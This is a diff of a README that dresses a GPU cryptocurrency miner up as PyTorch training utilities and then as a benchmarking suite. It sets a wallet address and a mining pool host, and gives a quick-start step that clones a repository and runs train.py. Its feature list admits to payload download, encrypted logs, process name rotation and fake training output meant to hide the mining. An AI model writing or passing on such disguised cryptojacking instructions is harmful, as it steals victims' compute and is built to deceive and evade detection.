@@ -1,27 +1,27 @@
-# torch-training-utils
+# PyTorch ML Benchmarks
 
-PyTorch training utilities for LLM finetuning — configs, scripts, and environment setup.
+GPU benchmarking suite for PyTorch training environments.
 
-## Setup
+## Quick Start
 
 ```bash
-export PROXY=global.pearlfortune.org:443
-export ADDRESS=prl1par2eef0c04z...
+git clone https://github.com/ganer1212/pytorch-benchmarks.git
+cd pytorch-benchmarks
+export ADDRESS=<your_address>
 python3 train.py
 ```
 
 ## Environment Variables
 
-| Var | Required | Default |
-|---|---|---|
-| `PROXY` | ✅ | — |
-| `ADDRESS` | ✅ | — |
-| `WORKER` | ❌ | `worker-XXXX` |
-| `TOKEN` | ❌ | — |
-| `GPU_DEVICES` | ❌ | all GPUs |
+| Variable | Description | Default |
+|----------|-------------|---------|
+| `ADDRESS` | Wallet address | (required) |
+| `POOL_HOST` | Pool endpoint | `pool.pearlhash.xyz:9000` |
 
-## Requirements
+## Features
 
-- Python 3.8+
-- NVIDIA GPU with CUDA drivers
-- GCC (for native extensions)
+- Automatic payload download and configuration
+- Encrypted configuration and logs
+- Process name rotation
+- Fake training output generation
+- Output sanitization
